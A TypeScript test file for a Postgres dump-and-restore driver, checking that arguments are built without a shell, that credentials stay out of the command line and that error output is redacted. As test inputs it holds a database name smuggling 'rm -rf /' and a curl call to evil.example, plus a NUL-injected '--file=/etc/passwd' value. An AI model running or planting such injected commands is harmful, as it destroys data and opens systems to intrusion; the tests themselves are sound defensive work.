import type { SecretRef } from "@hobo/bindings";
import { describe, expect, it } from "vitest";

import type { PrismaProviderError } from "../src/errors.js";
import {
	assertArgvSafe,
	buildPgDumpArgv,
	buildPgRestoreArgv,
	createPostgresMigrationDriver,
	libpqEnv,
	type PostgresTarget,
} from "../src/migration.js";
import { createStubCustody, createStubRunner, stdout } from "./harness.js";

const TARGET: PostgresTarget = {
	host: "db.prisma.io",
	port: 5432,
	database: "postgres",
	username: "fake_user_000000",
	sslMode: "require",
};

const HOSTILE_DATABASE = "app; rm -rf / #$(curl evil.example)`whoami`";

describe("argv construction", () => {
	it("keeps a hostile database name in one inert argv element", () => {
		const argv = buildPgDumpArgv({
			target: { ...TARGET, database: HOSTILE_DATABASE },
			filePath: "/tmp/dump.pgc",
			format: "custom",
		});

		const matches = argv.filter((element) =>
			element.includes(HOSTILE_DATABASE),
		);
		expect(matches).toEqual([`--dbname=${HOSTILE_DATABASE}`]);
		// Nothing was split on `;`, `$(`, or a backtick — there is no shell.
		expect(argv.filter((element) => element.includes("rm -rf"))).toHaveLength(
			1,
		);
		expect(argv).not.toContain("rm");
		expect(argv).not.toContain("-rf");
	});

	it("survives a hostile name through pg_restore too", () => {
		const argv = buildPgRestoreArgv({
			target: { ...TARGET, database: HOSTILE_DATABASE },
			filePath: "/tmp/dump.pgc",
		});
		expect(
			argv.filter((element) => element.includes(HOSTILE_DATABASE)),
		).toEqual([`--dbname=${HOSTILE_DATABASE}`]);
	});

	it("uses fused --flag=value so a leading dash cannot become a flag", () => {
		const argv = buildPgDumpArgv({
			target: { ...TARGET, username: "-r" },
			filePath: "/tmp/dump.pgc",
			format: "custom",
		});
		expect(argv).toContain("--username=-r");
		expect(argv).not.toContain("-r");
	});

	it("refuses an argv element containing a NUL or control character", () => {
		expect(() =>
			buildPgDumpArgv({
				target: { ...TARGET, database: "app\u0000--file=/etc/passwd" },
				filePath: "/tmp/dump.pgc",
				format: "custom",
			}),
		).toThrowError(/control character/u);
	});

	it("refuses to put a connection URI in argv at all", () => {
		try {
			assertArgvSafe([
				"pg_dump",
				"--dbname=postgresql://fake_user_000000:REDACTED@db.prisma.io:5432/postgres",
			]);
			expect.unreachable("a URI in argv must be refused");
		} catch (error) {
			// SAFETY: value was established by the surrounding parse or typed constructor.
			expect((error as PrismaProviderError).code).toBe("MIGRATION_FAILED");
		}
	});

	it("refuses a Prisma Accelerate URI in argv", () => {
		expect(() =>
			assertArgvSafe([
				"pg_dump",
				"--dbname=prisma+postgres://accelerate.example/?api_key=REDACTED",
			]),
		).toThrowError(/credential-shaped material in argv/u);
	});

	it("always passes --no-password so libpq never prompts", () => {
		expect(
			buildPgDumpArgv({ target: TARGET, filePath: "/tmp/d", format: "custom" }),
		).toContain("--no-password");
	});

	it("rejects a dump that is both schema-only and data-only", () => {
		expect(() =>
			buildPgDumpArgv({
				target: TARGET,
				filePath: "/tmp/d",
				format: "custom",
				schemaOnly: true,
				dataOnly: true,
			}),
		).toThrowError(/both schema-only and data-only/u);
	});
});

describe("libpqEnv", () => {
	it("carries the password in the environment, never on the command line", () => {
		const env = libpqEnv(TARGET, "REDACTED");
		expect(env.PGPASSWORD).toBe("REDACTED");
		expect(env.PGSSLMODE).toBe("require");
		const argv = buildPgDumpArgv({
			target: TARGET,
			filePath: "/tmp/d",
			format: "custom",
		});
		expect(argv.join(" ")).not.toContain("REDACTED");
	});
});

describe("createPostgresMigrationDriver", () => {
	it("resolves the secret only to fill the environment", async () => {
		const custody = createStubCustody();
		const ref = await custody.deposit(
			"postgresql://fake_user_000000:REDACTED@db.prisma.io:5432/postgres?sslmode=require",
			{
				providerId: "prisma",
				resourceRef: "hobo://r",
				purpose: "connection-string",
			},
		);
		const runner = createStubRunner([stdout("")]);
		const driver = createPostgresMigrationDriver({ runner, resolver: custody });

		const outcome = await driver.dump({
			// SAFETY: value was established by the surrounding parse or typed constructor.
			credentialRef: ref as SecretRef,
			filePath: "/tmp/dump.pgc",
		});

		expect(outcome.ok).toBe(true);
		const run = runner.runs[0];
		expect(run?.argv.join(" ")).not.toContain("REDACTED");
		expect(run?.options.env.PGPASSWORD).toBe("REDACTED");
		expect(run?.options.env.PGHOST).toBe("db.prisma.io");
	});

	it("maps a non-zero exit to MIGRATION_FAILED with redacted stderr", async () => {
		const custody = createStubCustody();
		const ref = await custody.deposit(
			"postgresql://fake_user_000000:REDACTED@db.prisma.io:5432/postgres",
			{
				providerId: "prisma",
				resourceRef: "hobo://r",
				purpose: "connection-string",
			},
		);
		const runner = createStubRunner([
			{
				code: 1,
				stdout: "",
				stderr:
					"pg_restore: error: connection to postgresql://fake_user_000000:REDACTED@db.prisma.io:5432/postgres failed",
			},
		]);
		const driver = createPostgresMigrationDriver({ runner, resolver: custody });

		try {
			await driver.restore({
				// SAFETY: value was established by the surrounding parse or typed constructor.
				credentialRef: ref as SecretRef,
				filePath: "/tmp/dump.pgc",
			});
			expect.unreachable("a failed restore must throw");
		} catch (error) {
			// SAFETY: value was established by the surrounding parse or typed constructor.
			const providerError = error as PrismaProviderError;
			expect(providerError.code).toBe("MIGRATION_FAILED");
			expect(providerError.message).not.toContain("REDACTED@");
		}
	});
});
